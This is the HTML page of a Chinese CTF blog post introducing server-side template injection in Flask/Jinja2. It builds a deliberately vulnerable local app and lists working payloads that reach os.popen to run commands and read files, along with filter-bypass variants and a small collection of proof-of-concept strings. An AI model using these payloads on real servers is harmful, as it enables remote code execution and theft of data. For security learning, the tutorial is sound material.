@@ -1,0 +1,1207 @@
+<!DOCTYPE html>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,web,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="desperadoccy的小窝" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="ssti漏洞原理服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。目前主流模板引擎有python框架 jinja2 mako tornado djangoPHP框架 smarty tw">
+<meta name="keywords" content="CTF,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI入门">
+<meta property="og:url" content="https://desperadoccy.github.io/2019/09/05/SSTI/index.html">
+<meta property="og:site_name" content="desperadoccy的小窝">
+<meta property="og:description" content="ssti漏洞原理服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。目前主流模板引擎有python框架 jinja2 mako tornado djangoPHP框架 smarty tw">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://desperadoccy.github.io/2019/09/05/SSTI/1.png">
+<meta property="og:image" content="https://desperadoccy.github.io/2019/09/05/SSTI/2.png">
+<meta property="og:updated_time" content="2022-01-29T03:34:35.037Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSTI入门">
+<meta name="twitter:description" content="ssti漏洞原理服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。目前主流模板引擎有python框架 jinja2 mako tornado djangoPHP框架 smarty tw">
+<meta name="twitter:image" content="https://desperadoccy.github.io/2019/09/05/SSTI/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://desperadoccy.github.io/2019/09/05/SSTI/">
+
+
+
+
+
+  <title>SSTI入门 | desperadoccy的小窝</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">desperadoccy的小窝</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br>
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://desperadoccy.github.io/2019/09/05/SSTI/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="desperadoccy">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/favicon.ico">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="desperadoccy的小窝">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SSTI入门</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-05T09:47:17+08:00">
+                2019-09-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="ssti漏洞原理"><a href="#ssti漏洞原理" class="headerlink" title="ssti漏洞原理"></a>ssti漏洞原理</h3><p>服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。<br>目前主流模板引擎有<br>python框架 <code>jinja2</code> <code>mako</code> <code>tornado</code> <code>django</code><br>PHP框架 <code>smarty</code> <code>twig</code><br>java框架 <code>jade</code> <code>velocity</code><br><a id="more"></a></p>
+<h3 id="SSTI实战"><a href="#SSTI实战" class="headerlink" title="SSTI实战"></a>SSTI实战</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><blockquote>
+<p>python3.6 + flask + Windows10<br>IDE:pycharm</p>
+</blockquote>
+<p>服务端代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/test', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    a = parse.unquote(request.url)</span><br><span class="line">    template = <span class="string">'''</span></span><br><span class="line"><span class="string">        &lt;div class="center-content error"&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt; </span></span><br><span class="line"><span class="string">    '''</span> %(a)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">True</span></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p>ps:参考其他博客搭建时并不能起到预期的注入效果。<br>原因是没有对url进行解码<br>运行脚本后，若成功会显示如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* Debug mode: on</span><br><span class="line">* Restarting with stat</span><br><span class="line">* Debugger is active!</span><br><span class="line">* Debugger PIN: 333-327-733</span><br><span class="line">* Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)</span><br></pre></td></tr></table></figure>
+<p>接下来访问<a href="http://127.0.0.1:5000/" target="_blank" rel="noopener">http://127.0.0.1:5000/</a> 就可以进行注入实战了。</p>
+<h3 id="注入实战"><a href="#注入实战" class="headerlink" title="注入实战"></a>注入实战</h3><p>从后端代码我们可以发现，开发者直接将用户输入拼接到代码中，这一行为直接导致了SSTI漏洞。<br>尝试访问<a href="http://127.0.0.1:5000/?test=" target="_blank" rel="noopener">http://127.0.0.1:5000/?test=</a>20<br>浏览器返回结果为<br><img src="/2019/09/05/SSTI/1.png" alt="test"><br>这也就应证了SSTI漏洞的存在，服务器运行了用户的输入。<br>接下来，我们就可以利用python的函数来进行文件读取或者其他操作。<br>例如如下payload可以执行dir操作（windows系统）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&apos;popen&apos;](&apos;dir&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>payload的作用相当python中的</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(os.popen(<span class="string">'dir'</span>).read())</span><br></pre></td></tr></table></figure>
+<p>其大致含义为<br><code>&quot;&quot;是空字符串，&quot;&quot;.__class__为字符串类型,__bases[]为其父类,即&lt;object&gt;,__subclass__是object的所有子类,其中就有os类,之后的payload就是调用os的方法进行操作</code></p>
+<p>我们也可以这样读取文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&apos;popen&apos;](&apos;type app.py&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>相当于</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(os.popen(<span class="string">'type app.py'</span>).read())</span><br></pre></td></tr></table></figure>
+<p>浏览器返回结果为<br><img src="/2019/09/05/SSTI/2.png" alt="test"></p>
+<h3 id="ctf中的一些绕过tips"><a href="#ctf中的一些绕过tips" class="headerlink" title="ctf中的一些绕过tips"></a>ctf中的一些绕过tips</h3><p>ctf中不可能直接这样把漏洞暴露给你，一定会加一些过滤和干扰</p>
+<h4 id="过滤-等括号"><a href="#过滤-等括号" class="headerlink" title="过滤[]等括号"></a>过滤[]等括号</h4><p>使用gititem绕过。<br>如原poc</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>绕过后</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>.<span class="keyword">class</span>.bases.getitem(<span class="number">0</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="过滤了subclasses，拼凑法"><a href="#过滤了subclasses，拼凑法" class="headerlink" title="过滤了subclasses，拼凑法"></a>过滤了subclasses，拼凑法</h4><p>原poc</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>].subclasses()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>绕过</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>.<span class="keyword">class</span>.bases[<span class="number">0</span>]<span class="string">'subcla'</span>+<span class="string">'sses'</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="过滤class"><a href="#过滤class" class="headerlink" title="过滤class"></a>过滤class</h4><p>使用session</p>
+<p>poc</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[<span class="string">'cla'</span>+<span class="string">'ss'</span>].bases[<span class="number">0</span>].bases[<span class="number">0</span>].bases[<span class="number">0</span>].bases[<span class="number">0</span>].subclasses()[<span class="number">128</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>多个<code>bases[0]</code>是因为一直在向上找object类。使用mro就会很方便</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[<span class="string">'__cla'</span>+<span class="string">'ss__'</span>].__mro__[<span class="number">12</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request[<span class="string">'__cl'</span>+<span class="string">'ass__'</span>].__mro__[<span class="number">12</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="timeit姿势"><a href="#timeit姿势" class="headerlink" title="timeit姿势"></a>timeit姿势</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>,number=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">'dir'</span>).read()</span><br></pre></td></tr></table></figure>
+<h4 id="收藏的一些poc"><a href="#收藏的一些poc" class="headerlink" title="收藏的一些poc"></a>收藏的一些poc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">&#123;&#123;request[<span class="string">'__cl'</span>+<span class="string">'ass__'</span>].__base__.__base__.__base__[<span class="string">'__subcla'</span>+<span class="string">'sses__'</span>]()[<span class="number">60</span>][<span class="string">'__in'</span>+<span class="string">'it__'</span>][<span class="string">'__'</span>+<span class="string">'glo'</span>+<span class="string">'bal'</span>+<span class="string">'s__'</span>][<span class="string">'__bu'</span>+<span class="string">'iltins__'</span>][<span class="string">'ev'</span>+<span class="string">'al'</span>](<span class="string">'__im'</span>+<span class="string">'port__("os").po'</span>+<span class="string">'pen("ca"+"t a.php").re'</span>+<span class="string">'ad()'</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>还有就可以参考一下<a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">P师傅的博客</a></p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a><br><a href="https://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/" target="_blank" rel="noopener">服务端模板注入攻击(SSTI)之浅析</a></p>
+
+      
+    </div>
+    
+    
+    
+
+  <div>
+      
+        
+      
+  </div>
+  
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/02/sql-injection/" rel="next" title="sql注入进阶">
+                <i class="fa fa-chevron-left"></i> sql注入进阶
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/05/XXE/" rel="prev" title="XXE简析">
+                XXE简析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/favicon.ico" alt="desperadoccy">
+            
+              <p class="site-author-name" itemprop="name">desperadoccy</p>
+              <p class="site-description motion-element" itemprop="description">desperado个人博客，一个瞎学的软工狗。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">70</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/desperadoccy" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:desperado@nuaa.edu.cn" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ssti漏洞原理"><span class="nav-number">1.</span> <span class="nav-text">ssti漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI实战"><span class="nav-number">2.</span> <span class="nav-text">SSTI实战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.1.</span> <span class="nav-text">环境搭建</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入实战"><span class="nav-number">3.</span> <span class="nav-text">注入实战</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctf中的一些绕过tips"><span class="nav-number">4.</span> <span class="nav-text">ctf中的一些绕过tips</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤-等括号"><span class="nav-number">4.1.</span> <span class="nav-text">过滤[]等括号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤了subclasses，拼凑法"><span class="nav-number">4.2.</span> <span class="nav-text">过滤了subclasses，拼凑法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤class"><span class="nav-number">4.3.</span> <span class="nav-text">过滤class</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#timeit姿势"><span class="nav-number">4.4.</span> <span class="nav-text">timeit姿势</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#收藏的一些poc"><span class="nav-number">4.5.</span> <span class="nav-text">收藏的一些poc</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考资料"><span class="nav-number">5.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 &mdash; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">desperadoccy</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
